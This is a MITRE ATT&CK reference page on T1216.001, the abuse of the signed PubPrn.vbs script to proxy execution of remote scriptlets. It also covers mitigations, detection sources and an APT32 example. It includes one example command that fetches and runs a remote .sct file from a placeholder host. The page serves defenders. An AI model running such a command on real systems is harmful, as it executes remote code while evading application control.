MatricesEnterpriseMobileICSTacticsEnterpriseMobileICSTechniquesEnterpriseMobileICSDefensesData SourcesMitigationsEnterpriseMobileICSAssetsCTIGroupsSoftwareCampaignsResourcesGet StartedLearn More about ATT&CKATT&CKconATT&CK Data & ToolsFAQEngage with ATT&CKVersion HistoryLegal & BrandingBenefactorsBlogSearchATT&CKcon 5.0 returns October 22-23, 2024 in McLean, VA.Register heretoday!HomeTechniquesEnterpriseSystem Script Proxy ExecutionPubPrnSystem Script Proxy Execution:PubPrnOther sub-techniques of System Script Proxy Execution (2)IDNameT1216.001PubPrnT1216.002SyncAppvPublishingServerAdversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is aVisual Basicscript that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through theWindows Command ShellviaCscript.exe. For example, the following code publishes a printer within the specified domain:cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com.[1]Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.[2]To do so, adversaries may set the secondscript:parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command ispubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.In later versions of Windows (10+),PubPrn.vbshas been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter toLDAP://, vice thescript:moniker which could be used to reference remote code via HTTP(S).ID:T1216.001Sub-technique of:T1216ⓘTactic:Defense EvasionⓘPlatforms:WindowsⓘDefense Bypassed:Application Control, Digital Certificate ValidationContributors:Atul Nair, QualysVersion:2.0Created:03 February 2020Last Modified:18 April 2022Version PermalinkLive VersionProcedure ExamplesIDNameDescriptionG0050APT32APT32has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses.[3]MitigationsIDMitigationDescriptionM1040Behavior Prevention on EndpointOn Windows 10, update Windows Defender Application Control policies to include rules that block the older, vulnerable versions of PubPrn.[4]M1038Execution PreventionCertain signed scripts that can be used to execute other programs may not be necessary within a given environment. Use application control configured to block execution of these scripts if they are not required for a given system or network to prevent potential misuse by adversaries.DetectionIDData SourceData ComponentDetectsDS0017CommandCommand ExecutionMonitor executed commands and arguments for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.DS0009ProcessProcess CreationMonitor script processes, such as `cscript that may be used to proxy execution of malicious files.DS0012ScriptScript ExecutionMonitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.ReferencesJason Gerend. (2017, October 16). pubprn. Retrieved July 23, 2021.Nelson, M. (2017, August 3). WSH INJECTION: A CASE STUDY. Retrieved April 9, 2018.Carr, N. (2017, December 22). ItsReallyNick Status Update. Retrieved April 9, 2018.Microsoft. (2021, August 23). Retrieved August 16, 2021.×load more resultsContact UsTerms of UsePrivacy PolicyWebsite Changelog© 2015 - 2024, The MITRE Corporation. MITRE ATT&CK and ATT&CK are registered trademarks of The MITRE Corporation.